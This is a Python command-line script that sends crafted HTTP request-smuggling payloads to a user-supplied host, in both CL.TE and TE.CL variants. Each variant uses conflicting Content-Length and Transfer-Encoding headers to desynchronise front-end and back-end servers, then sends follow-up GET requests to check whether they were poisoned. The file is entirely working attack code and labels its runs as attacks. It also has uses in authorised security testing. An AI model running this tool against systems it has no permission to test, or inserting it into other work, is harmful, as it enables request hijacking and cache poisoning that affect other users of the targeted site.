import sys
import socket
import ssl
import argparse

def sendReq(ssock,req,pri):
	req = req.replace('\x0a','\x0d\x0a')
	a = ssock.send(req.encode('utf-8'))
	
	#print(req)
	#print(a)
	if pri==1:
		#print((a))
		#print()
		#print()
		pass
	
	if pri==1:
		d = ssock.recv(4096)
	
	if pri==1:
		print((d).decode('utf-8').split('\r\n')[0])
		return len(d)

def makeSocket(hostname,https):
	if https:
		context = ssl.create_default_context()
		s = socket.create_connection((hostname,443))
		ssock = context.wrap_socket(s,server_hostname = hostname)
		return ssock
	else:
		ssock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		ssock.connect((hostname,80))
		return ssock
		
		

parser = argparse.ArgumentParser()
parser.add_argument("--url","-u",help="Test URL for Smuggling",required=True)
parser.add_argument("--https","-s",help="Test Url is https(default : http(0), https(1))",default=0,type=int)
parser.add_argument("--method","-m",help="--method = cetl or tecl (default : cetl)",default="cetl")

args = parser.parse_args()

originalReq = '''GET / HTTP/1.1
Host: %s
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7

'''%args.url

tepayload = '''GPOST / HTTP/1.1
Host:%s
'''%args.url


if args.method=="tecl":
	tecl = '''POST / HTTP/1.1
Host:%s
Content-Length:%d
Transfer-Encoding:chunked
Accept-Encoding: deflate
'''%(args.url,len(hex(len(tepayload)+2)[2:]))
	
	ssock = makeSocket(args.url,args.https)
	tpayload = tepayload.split('\n')
	linecount = 0 

	for i in range(0,len(tpayload)):
		if tpayload[i]!='':
			linecount += 1
	
	body = '''
%s
%s
0

'''%(hex(len(tepayload)+linecount)[2:],tepayload)
	tecl = tecl + body
	sendReq(ssock,tecl,1)
	print('[+] tecl payload sent....!!')
	ssock.close()
	
	for i in range(0,2):
		ssock = makeSocket(args.url,args.https)
		sendReq(ssock,originalReq,1)
		ssock.close()

	print('[+] tecl attack end!')
	
else:
	body = '''
3
x=1
0

G'''

	linecount = body.count('\n')-1
	clte = '''POST / HTTP/1.1
Host:%s
Content-Length:%d
Transfer-Encoding:chunked
'''%(args.url,len(body)-1+linecount)

	clte = clte+body
	
	ssock = makeSocket(args.url,args.https)
	sendReq(ssock,clte,0)
	print('[+] clte payload sent....!!')
	ssock.close()
	
	for i in range(0,2):
		ssock = makeSocket(args.url,args.https)
		sendReq(ssock,originalReq,1)
		ssock.close()

	print('[+] clte attack end!')
	